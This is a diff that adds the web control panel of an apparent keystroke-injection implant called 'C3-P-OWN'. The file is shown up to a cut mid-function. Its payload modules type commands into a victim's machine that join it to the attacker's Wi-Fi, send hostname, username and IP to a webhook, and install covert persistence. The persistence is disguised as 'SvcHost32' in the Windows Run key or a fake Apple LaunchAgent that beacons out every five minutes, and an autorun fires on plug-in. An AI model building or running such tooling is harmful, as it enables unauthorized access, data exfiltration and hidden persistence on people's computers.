@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>C3-P-OWN // BEACON CTRL</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<style>
+  :root {
+    --bg: #0a0a0a; --panel: #101010; --border: #1e1e1e;
+    --red: #e03535; --red-dim: #7a1a1a;
+    --amber: #e08c00; --green: #22c55e;
+    --text: #c0c0c0; --dim: #555; --white: #e8e8e8;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg); color: var(--text);
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 13px; height: 100vh;
+    display: flex; flex-direction: column; overflow: hidden;
+  }
+
+  /* Header */
+  header {
+    background: #0d0d0d; border-bottom: 1px solid var(--red-dim);
+    padding: 10px 16px; display: flex; align-items: center;
+    justify-content: space-between; flex-shrink: 0;
+  }
+  .logo { color: var(--red); font-size: 15px; font-weight: bold; letter-spacing: 2px; }
+  .logo span { color: var(--dim); font-weight: normal; font-size: 11px; letter-spacing: 1px; }
+  .hdr-right { display: flex; align-items: center; gap: 20px; color: var(--dim); font-size: 11px; }
+  .beacon-dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: var(--green); display: inline-block; margin-right: 6px;
+    animation: pulse 2s infinite;
+  }
+  .beacon-dot.offline { background: var(--red); animation: none; }
+  @keyframes pulse {
+    0%,100% { opacity:1; box-shadow: 0 0 4px var(--green); }
+    50%      { opacity:.4; box-shadow: none; }
+  }
+  #uptime { color: var(--white); font-size: 12px; }
+
+  /* Main grid */
+  main {
+    display: grid; grid-template-columns: 270px 1fr;
+    gap: 1px; flex: 1; background: var(--border);
+    overflow: hidden; min-height: 0;
+  }
+
+  /* Left panel */
+  #session {
+    background: var(--panel); overflow-y: auto;
+    padding: 14px; display: flex; flex-direction: column;
+  }
+  #session::-webkit-scrollbar { width: 3px; }
+  #session::-webkit-scrollbar-thumb { background: var(--border); }
+
+  .sect-title {
+    color: var(--red); font-size: 10px; letter-spacing: 2px;
+    text-transform: uppercase; border-bottom: 1px solid var(--red-dim);
+    padding-bottom: 4px; margin-bottom: 10px; margin-top: 14px; flex-shrink: 0;
+  }
+  .sect-title:first-child { margin-top: 0; }
+
+  .kv { display: flex; justify-content: space-between; margin-bottom: 7px; gap: 8px; }
+  .kv .k { color: var(--dim); font-size: 11px; }
+  .kv .v { color: var(--white); font-size: 11px; text-align: right; word-break: break-all; }
+  .v.red   { color: var(--red); }
+  .v.green { color: var(--green); }
+  .v.amber { color: var(--amber); }
+
+  .conf-track { height: 4px; background: #1c1c1c; border-radius: 2px; margin: 2px 0 10px; overflow: hidden; }
+  .conf-fill  { height: 100%; border-radius: 2px; transition: width .5s, background .5s; }
+
+  /* OS override */
+  .ov-row { display: flex; gap: 4px; margin-top: 6px; }
+  .ov-btn {
+    flex: 1; background: #141414; border: 1px solid var(--border);
+    color: var(--dim); font-family: inherit; font-size: 10px;
+    padding: 5px 2px; cursor: pointer; border-radius: 2px;
+    letter-spacing: 1px; transition: all .15s;
+  }
+  .ov-btn:hover { border-color: var(--amber); color: var(--amber); }
+  .ov-btn.active { background: var(--amber); border-color: var(--amber); color: #000; font-weight: bold; }
+  .ov-clear {
+    display: block; width: 100%; margin-top: 5px;
+    background: transparent; border: 1px solid var(--border);
+    color: var(--dim); font-family: inherit; font-size: 10px;
+    padding: 4px; cursor: pointer; border-radius: 2px; letter-spacing: 1px; transition: all .15s;
+  }
+  .ov-clear:hover { border-color: var(--red-dim); color: var(--red); }
+
+  /* Module / custom command buttons */
+  .module-btn {
+    display: block; width: 100%; text-align: left;
+    background: #141414; border: 1px solid var(--border);
+    color: var(--text); font-family: inherit; font-size: 11px;
+    padding: 7px 10px; margin-bottom: 4px; cursor: pointer;
+    border-radius: 2px; transition: all .15s;
+  }
+  .module-btn::before { content: '▶ '; color: var(--red); }
+  .module-btn:hover { background: #1a1a1a; border-color: var(--red-dim); color: var(--white); }
+  .module-btn:active { background: var(--red-dim); }
+
+  .custom-row { display: flex; gap: 4px; margin-bottom: 4px; }
+  .custom-row .module-btn { margin-bottom: 0; flex: 1; min-width: 0; }
+  .del-btn {
+    background: transparent; border: 1px solid var(--border);
+    color: var(--dim); font-family: inherit; font-size: 11px;
+    padding: 0 8px; cursor: pointer; border-radius: 2px; flex-shrink: 0; transition: all .15s;
+  }
+  .del-btn:hover { border-color: var(--red); color: var(--red); }
+  .no-items { color: var(--dim); font-size: 11px; font-style: italic; }
+
+  /* Webhook config */
+  .hook-row { display: flex; gap: 4px; margin-top: 6px; }
+  .hook-url {
+    flex: 1; min-width: 0; background: #0d0d0d; border: 1px solid var(--border);
+    color: var(--white); font-family: inherit; font-size: 10px;
+    padding: 5px 6px; border-radius: 2px; outline: none;
+  }
+  .hook-url:focus { border-color: var(--red-dim); }
+  .hook-url::placeholder { color: var(--dim); }
+  .hook-set {
+    background: transparent; border: 1px solid var(--border);
+    color: var(--dim); font-family: inherit; font-size: 10px;
+    padding: 5px 8px; cursor: pointer; border-radius: 2px;
+    transition: all .15s; flex-shrink: 0;
+  }
+  .hook-set:hover { border-color: var(--green); color: var(--green); }
+  #hook-status { color: var(--dim); font-size: 10px; margin-top: 5px; font-style: italic; word-break: break-all; }
+  #hook-status.ok { color: var(--green); font-style: normal; }
+  .exfil-btn {
+    display: block; width: 100%; text-align: left;
+    background: #0a130a; border: 1px solid #1a3a1a;
+    color: var(--green); font-family: inherit; font-size: 11px;
+    padding: 7px 10px; margin-bottom: 4px; cursor: pointer;
+    border-radius: 2px; transition: all .15s;
+  }
+  .exfil-btn::before { content: '⬆ '; }
+  .exfil-btn:hover { background: #112011; border-color: var(--green); }
+  .persist-btn {
+    display: block; width: 100%; text-align: left;
+    background: #131000; border: 1px solid #3a2800;
+    color: var(--amber); font-family: inherit; font-size: 11px;
+    padding: 7px 10px; margin-bottom: 4px; cursor: pointer;
+    border-radius: 2px; transition: all .15s;
+  }
+  .persist-btn::before { content: '⚓ '; }
+  .persist-btn:hover { background: #1f1800; border-color: var(--amber); }
+  .persist-btn.remove { color: var(--red); background: #130000; border-color: #3a0000; }
+  .persist-btn.remove::before { content: '✕ '; }
+  .persist-btn.remove:hover { background: #1f0000; border-color: var(--red); }
+
+  /* Right column */
+  .right-col {
+    display: flex; flex-direction: column;
+    overflow: hidden; gap: 1px; background: var(--border);
+  }
+
+  /* Command builder */
+  #builder-panel { background: var(--panel); padding: 12px 16px; flex-shrink: 0; }
+
+  .builder-top { display: flex; gap: 6px; align-items: center; margin-top: 8px; flex-wrap: wrap; }
+  #builder-name {
+    flex: 1; min-width: 100px;
+    background: #0d0d0d; border: 1px solid var(--border);
+    color: var(--white); font-family: inherit; font-size: 12px;
+    padding: 5px 8px; border-radius: 2px; outline: none;
+  }
+  #builder-name:focus { border-color: var(--red-dim); }
+  #builder-name::placeholder { color: var(--dim); }
+  #builder-os {
+    background: #0d0d0d; border: 1px solid var(--border);
+    color: var(--text); font-family: inherit; font-size: 11px;
+    padding: 5px 6px; border-radius: 2px; outline: none; cursor: pointer;
+  }
+  .bld-btn {
+    background: var(--red-dim); border: 1px solid var(--red);
+    color: var(--red); font-family: inherit; font-size: 11px; font-weight: bold;
+    padding: 5px 10px; cursor: pointer; border-radius: 2px;
+    letter-spacing: 1px; transition: all .15s; white-space: nowrap;
+  }
+  .bld-btn:hover { background: var(--red); color: #000; }
+  .bld-btn.sec {
+    background: transparent; border-color: var(--border); color: var(--dim);
+  }
+  .bld-btn.sec:hover { border-color: var(--green); color: var(--green); background: transparent; }
+
+  /* Steps list */
+  #builder-steps {
+    max-height: 140px; overflow-y: auto;
+    margin: 8px 0 4px; border: 1px solid var(--border);
+    border-radius: 2px; background: #0d0d0d;
+  }
+  #builder-steps::-webkit-scrollbar { width: 3px; }
+  #builder-steps::-webkit-scrollbar-thumb { background: var(--border); }
+  .step-item {
+    display: flex; align-items: center;
+    padding: 4px 8px; border-bottom: 1px solid var(--border); font-size: 11px;
+  }
+  .step-item:last-child { border-bottom: none; }
+  .step-num { color: var(--dim); width: 18px; flex-shrink: 0; font-size: 10px; }
+  .step-tag { color: var(--amber); margin-right: 6px; flex-shrink: 0; font-size: 10px; width: 38px; }
+  .step-val { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .step-del {
+    background: transparent; border: none; color: var(--dim);
+    cursor: pointer; font-size: 11px; padding: 2px 5px; flex-shrink: 0;
+  }
+  .step-del:hover { color: var(--red); }
+  #steps-empty { padding: 10px; color: var(--dim); font-size: 11px; font-style: italic; text-align: center; }
+
+  /* Add step row */
+  .add-row { display: flex; gap: 5px; align-items: center; margin-top: 6px; flex-wrap: wrap; }
+  #step-type, #step-key-in {
+    background: #0d0d0d; border: 1px solid var(--border);
+    color: var(--text); font-family: inherit; font-size: 11px;
+    padding: 5px 6px; border-radius: 2px; outline: none; cursor: pointer;
+  }
+  #step-type { flex-shrink: 0; }
+  #step-key-in { flex: 1; }
+  #step-text-in {
+    flex: 1; min-width: 80px;
+    background: #0d0d0d; border: 1px solid var(--border);
+    color: var(--white); font-family: inherit; font-size: 11px;
+    padding: 5px 8px; border-radius: 2px; outline: none;
+  }
+  #step-text-in:focus { border-color: var(--red-dim); }
+  #step-text-in::placeholder { color: var(--dim); }
+  #step-ms-in {
+    width: 72px; background: #0d0d0d; border: 1px solid var(--border);
+    color: var(--white); font-family: inherit; font-size: 11px;
+    padding: 5px 6px; border-radius: 2px; outline: none; text-align: right;
+  }
+  .add-btn {
+    background: #1a1a1a; border: 1px solid var(--border);
+    color: var(--green); font-family: inherit; font-size: 13px; font-weight: bold;
+    padding: 4px 12px; cursor: pointer; border-radius: 2px;
+    transition: all .15s; flex-shrink: 0;
+  }
+  .add-btn:hover { background: var(--green); color: #000; }
+
+  /* Output panel */
+  #output-panel {
+    background: var(--panel); padding: 12px 16px;
+    flex: 1; overflow: hidden; display: flex; flex-direction: column; min-height: 0;
+  }
+  #output-stream {
+    flex: 1; overflow-y: auto; font-size: 12px; line-height: 1.7;
+    color: var(--text); padding-right: 4px; min-height: 0;
+  }
+  #output-stream::-webkit-scrollbar { width: 4px; }
+  #output-stream::-webkit-scrollbar-track { background: transparent; }
+  #output-stream::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+  .log-line  { display: block; }
+  .log-ts    { color: var(--dim); margin-right: 8px; font-size: 11px; }
+  .log-sys   { color: var(--amber); }
+  .log-exfil { color: var(--green); }
+  .log-dim   { color: var(--dim); font-style: italic; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">C3-P-OWN <span>// BEACON CONTROL</span></div>
+  <div class="hdr-right">
+    <span><span class="beacon-dot" id="beacon-dot"></span><span id="beacon-status">CONNECTING</span></span>
+    <span>UPTIME <span id="uptime">--:--:--</span></span>
+  </div>
+</header>
+
+<main>
+  <!-- Left panel: session + override + premades + saved customs -->
+  <div id="session">
+    <div class="sect-title">SESSION</div>
+    <div class="kv"><span class="k">HOST OS</span>    <span class="v" id="os-val">PENDING</span></div>
+    <div class="kv"><span class="k">CONFIDENCE</span> <span class="v" id="conf-val">—</span></div>
+    <div class="conf-track"><div class="conf-fill" id="conf-fill" style="width:0%"></div></div>
+    <div class="kv"><span class="k">AP IP</span>      <span class="v">192.168.4.1</span></div>
+    <div class="kv"><span class="k">NAT</span>        <span class="v" id="nat-val">OFFLINE</span></div>
+
+    <div class="sect-title">OS OVERRIDE</div>
+    <div class="ov-row">
+      <button class="ov-btn" id="ov-win" onclick="setOverride('WIN')">WIN</button>
+      <button class="ov-btn" id="ov-mac" onclick="setOverride('MAC')">MAC</button>
+    </div>
+    <button class="ov-clear" onclick="clearOverride()">✕ CLEAR</button>
+
+    <div class="sect-title">PAYLOAD MODULES</div>
+    <div id="module-list"><span class="no-items">Awaiting OS detection...</span></div>
+
+    <div class="sect-title">SAVED COMMANDS</div>
+    <div id="custom-list"><span class="no-items">No saved commands.</span></div>
+
+    <div class="sect-title">WEBHOOK</div>
+    <div class="hook-row">
+      <input id="hook-url" class="hook-url" type="text" placeholder="https://webhook.site/...">
+      <button class="hook-set" onclick="saveHook()">SET</button>
+    </div>
+    <div id="hook-status">Not configured</div>
+
+    <div class="sect-title">UPSTREAM WIFI</div>
+    <input id="up-ssid" class="hook-url" type="text" placeholder="SSID..." style="width:100%;margin-bottom:4px">
+    <input id="up-pass" class="hook-url" type="password" placeholder="Password..." style="width:100%;margin-bottom:5px">
+    <button class="hook-set" onclick="setUpstream()" style="width:100%;padding:6px">CONNECT + ENABLE NAT</button>
+    <div id="up-status" style="color:var(--dim);font-size:10px;margin-top:5px;font-style:italic">Not connected</div>
+
+    <div class="sect-title">AUTORUN CONFIG</div>
+    <div class="kv"><span class="k">WIN</span><span class="v" id="ar-win-status" style="font-size:10px">—</span></div>
+    <div class="kv"><span class="k">MAC</span><span class="v" id="ar-mac-status" style="font-size:10px">—</span></div>
+    <div style="display:flex;gap:4px;margin-top:4px">
+      <button class="ov-btn" onclick="clearAutorun('WIN')">CLEAR WIN</button>
+      <button class="ov-btn" onclick="clearAutorun('MAC')">CLEAR MAC</button>
+    </div>
+    <div style="color:var(--dim);font-size:10px;margin-top:6px;font-style:italic">Build a payload → select OS → click ⚡ AUTORUN to save</div>
+  </div>
+
+  <!-- Right column: command builder + exfil output -->
+  <div class="right-col">
+
+    <!-- Command builder -->
+    <div id="builder-panel">
+      <div class="sect-title" style="margin-top:0">COMMAND BUILDER</div>
+
+      <div class="builder-top">
+        <input id="builder-name" type="text" placeholder="Command name...">
+        <select id="builder-os">
+          <option value="WIN">WIN</option>
+          <option value="MAC">MAC</option>
+          <option value="ANY">ANY</option>
+        </select>
+        <button class="bld-btn sec" onclick="runBuilder()">▶ RUN</button>
+        <button class="bld-btn" onclick="saveBuilderCmd()">SAVE</button>
+        <button class="bld-btn" onclick="saveAutorun()" title="Save as auto-run on plug-in">⚡ AUTORUN</button>
+      </div>
+
+      <div id="builder-steps"><div id="steps-empty">No steps — add one below</div></div>
+
+      <div class="add-row">
+        <select id="step-type" onchange="updateStepInput()">
+          <option value="TYPE">TYPE</option>
+          <option value="PRESS">PRESS</option>
+          <option value="WAIT">WAIT</option>
+        </select>
+        <input  id="step-text-in" type="text" placeholder="text to type...">
+        <select id="step-key-in"  style="display:none">
+          <option value="GUI">GUI (Win/⌘ alone)</option>
+          <option value="ENTER">ENTER</option>
+          <option value="WIN_R">WIN+R  — Run dialog</option>
+          <option value="WIN_L">WIN+L  — Lock screen</option>
+          <option value="WIN_E">WIN+E  — Explorer</option>
+          <option value="WIN_D">WIN+D  — Show desktop</option>
+          <option value="WIN_X">WIN+X  — Power User menu</option>
+          <option value="CMD_SPACE">CMD+SPACE — Spotlight</option>
+          <option value="CMD_T">CMD+T  — New tab/term</option>
+          <option value="ESC">ESC</option>
+          <option value="TAB">TAB</option>
+        </select>
+        <input  id="step-ms-in"   type="number" value="500" min="100" max="10000" step="100" style="display:none">
+        <button class="add-btn" onclick="addBuilderStep()">+</button>
+      </div>
+    </div>
+
+    <!-- Exfil output -->
+    <div id="output-panel">
+      <div class="sect-title" style="margin-top:0">EXFIL OUTPUT</div>
+      <div id="output-stream">
+        <span class="log-line">
+          <span class="log-ts">[--:--:--]</span>
+          <span class="log-sys">BEACON ONLINE — AWAITING IMPLANT...</span>
+        </span>
+      </div>
+    </div>
+
+  </div><!-- .right-col -->
+</main>
+
+<script>
+  // ── Utilities ──
+  function pad(n){ return String(n).padStart(2,'0'); }
+  function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+  function uid(){ return Math.random().toString(36).slice(2,9); }
+  function escHtml(s){
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+
+  // Uptime
+  var startTs = Date.now();
+  function fmtUptime(ms){
+    var s=Math.floor(ms/1000),m=Math.floor(s/60),h=Math.floor(m/60);
+    return pad(h)+':'+pad(m%60)+':'+pad(s%60);
+  }
+  setInterval(function(){ document.getElementById('uptime').textContent=fmtUptime(Date.now()-startTs); },1000);
+  function nowTs(){ var d=new Date(); return pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds()); }
+
+  // ── Output stream ──
+  var lastLogs = '';
+  function appendLog(text, cls){
+    var box = document.getElementById('output-stream');
+    var ln  = document.createElement('span');
+    ln.className = 'log-line';
+    ln.innerHTML = '<span class="log-ts">['+nowTs()+']</span>'
+                 + '<span class="'+(cls||'')+'">'+escHtml(text)+'</span>';
+    box.appendChild(ln);
+    box.scrollTop = box.scrollHeight;
+  }
+
+  // ── Command execution ──
+  function sendCmd(cmd){ return fetch('/execute?val='+encodeURIComponent(cmd)); }
+
+  async function runSteps(steps){
+    for(var i=0;i<steps.length;i++){
+      var s=steps[i];
+      if(s.t==='WAIT'){
+        appendLog('... wait '+s.ms+'ms','log-dim');
+        await sleep(s.ms);
+      } else if(s.t==='TYPE'){
+        await sendCmd('TYPE '+s.v);
+        appendLog('TYPE  › '+s.v,'log-sys');
+        await sleep(300);
+      } else if(s.t==='PRESS'){
+        await sendCmd('PRESS '+s.k);
+        appendLog('PRESS › '+s.k,'log-sys');
+        await sleep(250);
+      }
+    }
+  }
+
+  // ── Premade payload modules ──
+  var WIN_WIFI_CMD = '$p=\'pl$Ch@ng3Me\'; [xml]$x="<WLANProfile xmlns=\'http://www.microsoft.com/networking/WLAN/profile/v1\'><name>C3P</name><SSIDConfig><SSID><name>C3-P-Own</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>manual</connectionMode><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>$p</keyMaterial></sharedKey></security></MSM></WLANProfile>"; $x.Save("$env:TEMP\\c.xml"); netsh wlan add profile filename="$env:TEMP\\c.xml"; netsh wlan connect name=C3P';
+  var MAC_WIFI_CMD = 'networksetup -setairportnetwork en0 "C3-P-Own" \'pl$Ch@ng3Me\' 2>/dev/null; networksetup -setairportnetwork en1 "C3-P-Own" \'pl$Ch@ng3Me\' 2>/dev/null';
+  var PRESETS = {
+    WIN:[
+      {label:'JOIN C3-P-OWN', steps:[
+        {t:'PRESS',k:'GUI'},{t:'WAIT',ms:700},{t:'TYPE',v:'powershell'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:1500},
+        {t:'TYPE',v:WIN_WIFI_CMD},{t:'PRESS',k:'ENTER'}
+      ]},
+      {label:'SPAWN POWERSHELL', steps:[
+        {t:'PRESS',k:'GUI'},{t:'WAIT',ms:700},{t:'TYPE',v:'powershell'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:1200}
+      ]},
+      {label:'SPAWN CMD', steps:[
+        {t:'PRESS',k:'GUI'},{t:'WAIT',ms:700},{t:'TYPE',v:'cmd'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:1200}
+      ]},
+      {label:'OPEN RUN DIALOG', steps:[{t:'PRESS',k:'WIN_R'},{t:'WAIT',ms:400}]},
+      {label:'LOCK SCREEN',     steps:[{t:'PRESS',k:'WIN_L'}]},
+      {label:'OPEN EXPLORER',   steps:[{t:'PRESS',k:'WIN_E'},{t:'WAIT',ms:800}]},
+      {label:'SHOW DESKTOP',    steps:[{t:'PRESS',k:'WIN_D'}]},
+      {label:'POWER USER MENU', steps:[{t:'PRESS',k:'WIN_X'},{t:'WAIT',ms:400}]},
+      {label:'GET WHOAMI',      steps:[{t:'TYPE',v:'whoami'},{t:'PRESS',k:'ENTER'}]},
+      {label:'GET IPCONFIG',    steps:[{t:'TYPE',v:'ipconfig'},{t:'PRESS',k:'ENTER'}]},
+    ],
+    MAC:[
+      {label:'JOIN C3-P-OWN', steps:[
+        {t:'PRESS',k:'CMD_SPACE'},{t:'WAIT',ms:700},{t:'TYPE',v:'terminal'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:1500},
+        {t:'TYPE',v:MAC_WIFI_CMD},{t:'PRESS',k:'ENTER'}
+      ]},
+      {label:'OPEN SPOTLIGHT', steps:[{t:'PRESS',k:'CMD_SPACE'},{t:'WAIT',ms:600}]},
+      {label:'SPAWN TERMINAL', steps:[
+        {t:'PRESS',k:'CMD_SPACE'},{t:'WAIT',ms:700},{t:'TYPE',v:'terminal'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:1500}
+      ]},
+      {label:'SPAWN ITERM2', steps:[
+        {t:'PRESS',k:'CMD_SPACE'},{t:'WAIT',ms:700},{t:'TYPE',v:'iterm'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:1500}
+      ]},
+      {label:'OPEN SAFARI', steps:[
+        {t:'PRESS',k:'CMD_SPACE'},{t:'WAIT',ms:700},{t:'TYPE',v:'safari'},{t:'PRESS',k:'ENTER'}
+      ]},
+      {label:'NEW TERM TAB',  steps:[{t:'PRESS',k:'CMD_T'}]},
+      {label:'GET WHOAMI',    steps:[{t:'TYPE',v:'whoami'},{t:'PRESS',k:'ENTER'}]},
+      {label:'GET SYSINFO',   steps:[{t:'TYPE',v:'uname -a'},{t:'PRESS',k:'ENTER'}]},
+      {label:'GET IFCONFIG',  steps:[{t:'TYPE',v:'ifconfig'},{t:'PRESS',k:'ENTER'}]},
+    ]
+  };
+
+  // ── Autorun config ──────────────────────────────────────────────────────────
+  function saveAutorun(){
+    if(!builderSteps.length){ appendLog('No steps to save as autorun','log-err'); return; }
+    var os = document.getElementById('builder-os').value;
+    if(os==='ANY'){ appendLog('Select WIN or MAC for autorun (not ANY)','log-err'); return; }
+    fetch('/setAutorun?os='+os, {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(builderSteps)
+    }).then(function(r){ return r.text(); }).then(function(t){
+      if(t==='OK'){
+        appendLog('AUTORUN saved for '+os+' ('+builderSteps.length+' steps)','log-sys');
+        loadARStatus();
+      } else { appendLog('AUTORUN save failed','log-err'); }
+    });
+  }
+  function clearAutorun(os){
+    fetch('/clearAutorun?os='+os).then(function(){ loadARStatus(); appendLog('AUTORUN cleared for '+os,'log-sys'); });
+  }
+  function loadARStatus(){
+    ['WIN','MAC'].forEach(function(os){
+      fetch('/getAutorun?os='+os).then(function(r){ return r.json(); }).then(function(steps){
+        var el = document.getElementById('ar-'+os.toLowerCase()+'-status');
+        if(steps && steps.length){
+          el.textContent = steps.length+' steps';
+          el.className = 'v green';
+        } else {
+          el.textContent = '—';
+          el.className = 'v';
+        }
+      }).catch(function(){ });
+    });
+  }
+
+  // ── Upstream WiFi / NAT ──
+  function setUpstream(){
+    var ssid = document.getElementById('up-ssid').value.trim();
+    var pass = document.getElementById('up-pass').value;
+    if(!ssid) return;
+    document.getElementById('up-status').textContent = 'Connecting...';
+    document.getElementById('up-status').className = '';
+    fetch('/setUpstream?ssid='+encodeURIComponent(ssid)+'&pass='+encodeURIComponent(pass))
+      .then(function(r){ return r.text(); })
+      .then(function(t){
+        if(t==='OK'){
+          document.getElementById('up-status').textContent = '✓ NAT active — '+ssid;
+          document.getElementById('up-status').style.color = 'var(--green)';
+          document.getElementById('up-status').style.fontStyle = 'normal';
+          document.getElementById('nat-val').textContent = 'ACTIVE';
+          document.getElementById('nat-val').className = 'v green';
+        } else {
+          document.getElementById('up-status').textContent = '✗ Failed — check credentials';
+          document.getElementById('up-status').style.color = 'var(--red)';
+          document.getElementById('nat-val').textContent = 'FAILED';
+          document.getElementById('nat-val').className = 'v red';
+        }
+      });
+  }
+
+  // ── Webhook config ──
+  var hookUrl = localStorage.getItem('c3p_hook') || '';
+
+  function saveHook(){
+    hookUrl = document.getElementById('hook-url').value.trim();
+    if(hookUrl){
+      localStorage.setItem('c3p_hook', hookUrl);
+      document.getElementById('hook-status').textContent = '✓ ' + hookUrl.replace(/^https?:\/\//,'').slice(0,34);
+      document.getElementById('hook-status').className = 'ok';
+    } else {
+      localStorage.removeItem('c3p_hook');
+      document.getElementById('hook-status').textContent = 'Not configured';
+      document.getElementById('hook-status').className = '';
+    }
+    renderModules();
+  }
+
+  function getExfilSteps(os){
+    if(!hookUrl) return null;
+    if(os==='WIN') return [
+      {t:'TYPE', v:'$u=\''+hookUrl+'\'; iwr "$u?host=$(hostname)&user=$env:USERNAME&ip=$(ipconfig | sls IPv4 | select -first 1)" -UseBasicParsing'},
+      {t:'PRESS', k:'ENTER'}
+    ];
+    if(os==='MAC') return [
+      {t:'TYPE', v:'curl -s "'+hookUrl+'?host=$(hostname)&user=$(whoami)&ip=$(ipconfig getifaddr en0 2>/dev/null)"'},
+      {t:'PRESS', k:'ENTER'}
+    ];
+    return null;
+  }
+
+  // ── OS state ──
+  var overrideOS   = null;
+  var detectedOS   = '';
+  var detectedConf = 0;
+  function effectiveOS(){ return overrideOS || detectedOS; }
+
+  function setOverride(os){
+    overrideOS = os;
+    document.getElementById('ov-win').classList.toggle('active', os==='WIN');
+    document.getElementById('ov-mac').classList.toggle('active', os==='MAC');
+    document.getElementById('os-val').textContent  = os+' [FORCED]';
+    document.getElementById('os-val').className    = 'v amber';
+    document.getElementById('conf-val').textContent = 'MANUAL';
+    var fill = document.getElementById('conf-fill');
+    fill.style.width = '100%'; fill.style.background = 'var(--amber)';
+    renderModules();
+  }
+
+  function clearOverride(){
+    overrideOS = null;
+    document.getElementById('ov-win').classList.remove('active');
+    document.getElementById('ov-mac').classList.remove('active');
+    renderStatus(detectedOS, detectedConf);
+    renderModules();
+  }
+
+  function getPersistSteps(os){
+    var hook = hookUrl || '';
+    if(os==='WIN'){
+      var loop = hook
+        ? 'while($true){try{iwr \''+hook+'?h=$(hostname)&u=$env:USERNAME&p=beacon\' -UseBasicParsing}catch{};sleep 300}'
+        : 'while($true){sleep 300}';
+      var cmd = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SvcHost32 /t REG_SZ /d "powershell -w hidden -c '+loop+'" /f';
+      return [
+        {t:'PRESS',k:'GUI'},{t:'WAIT',ms:700},
+        {t:'TYPE',v:'powershell'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:1500},
+        {t:'TYPE',v:cmd},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:600},
+        {t:'TYPE',v:'exit'},{t:'PRESS',k:'ENTER'}
+      ];
+    } else {
+      var sh = hook
+        ? "while true; do curl -s '"+hook+"?h=$(hostname)&u=$(whoami)&p=beacon' &>/dev/null; sleep 300; done"
+        : 'while true; do sleep 300; done';
+      var plist = "python3 -c \"import plistlib,os; d={'Label':'com.apple.svc32','ProgramArguments':['/bin/bash','-c','"+sh.replace(/\\/g,'\\\\').replace(/"/g,'\\"')+"'],'RunAtLoad':True,'KeepAlive':True}; plistlib.dump(d,open(os.path.expanduser('~/Library/LaunchAgents/com.apple.svc32.plist'),'wb'))\"";
+      return [
+        {t:'PRESS',k:'CMD_SPACE'},{t:'WAIT',ms:700},
+        {t:'TYPE',v:'terminal'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:1500},
+        {t:'TYPE',v:plist},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:800},
+        {t:'TYPE',v:'launchctl load ~/Library/LaunchAgents/com.apple.svc32.plist'},{t:'PRESS',k:'ENTER'}
+      ];
+    }
+  }
+  function getRemovePersistSteps(os){
+    if(os==='WIN') return [
+      {t:'PRESS',k:'GUI'},{t:'WAIT',ms:700},
+      {t:'TYPE',v:'powershell'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:1500},
+      {t:'TYPE',v:'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SvcHost32 /f'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:400},
+      {t:'TYPE',v:'exit'},{t:'PRESS',k:'ENTER'}
+    ];
+    return [
+      {t:'PRESS',k:'CMD_SPACE'},{t:'WAIT',ms:700},
+      {t:'TYPE',v:'terminal'},{t:'PRESS',k:'ENTER'},{t:'WAIT',ms:1500},
+      {t:'TYPE',v:'launchctl unload ~/Library/LaunchAgents/com.apple.svc32.plist 2>/dev/null; rm -f ~/Library/LaunchAgents/com.apple.svc32.plist'},{t:'PRESS',k:'ENTER'}
+    ];
+  }
+
+  function renderModules(){
+    var os   = effectiveOS();
+    var list = document.getElementById('module-list');
+    var mods = PRESETS[os];
+    if(!mods){ list.innerHTML='<span class="no-items">Awaiting OS detection...</span>'; return; }
+    list.innerHTML = '';
+    // Exfil button at the top when webhook is configured
+    var exSteps = getExfilSteps(os);
+    if(exSteps){
+      var eb = document.createElement('button');
+      eb.className   = 'exfil-btn';
+      eb.textContent = 'EXFIL → WEBHOOK';
+      (function(s){ eb.addEventListener('click', function(){ runSteps(s); }); })(exSteps);
+      list.appendChild(eb);
+    }
+    // Persistence buttons (always shown for WIN/MAC)
+    if(os==='WIN'||os==='MAC'){
+      var pb = document.createElement('button');
+      pb.className   = 'persist-btn';
+      pb.textContent = 'INSTALL PERSISTENCE';
+      (function(s){ pb.addEventListener('click', function(){ runSteps(s); }); })(getPersistSteps(os));
+      list.appendChild(pb);
+      var rb = document.createElement('button');
+      rb.className   = 'persist-btn remove';
+      rb.textContent = 'REMOVE PERSISTENCE';
+      (function(s){ rb.addEventListener('click', function(){ runSteps(s); }); })(getRemovePersistSteps(os));
+      list.appendChild(rb);
+    }
+    mods.forEach(function(m){
+      var btn = document.createElement('button');
+      btn.className   = 'module-btn';
+      btn.textContent = m.label;
+      (function(steps){ btn.addEventListener('click', function(){ runSteps(steps); }); })(m.steps);
+      list.appendChild(btn);
+    });
+  }
+
+  function renderStatus(os, conf){
+    if(overrideOS) return;
+    var osEl   = document.getElementById('os-val');
+    var confEl = document.getElementById('conf-val');
+    var fill   = document.getElementById('conf-fill');
+    var dot    = document.getElementById('beacon-dot');
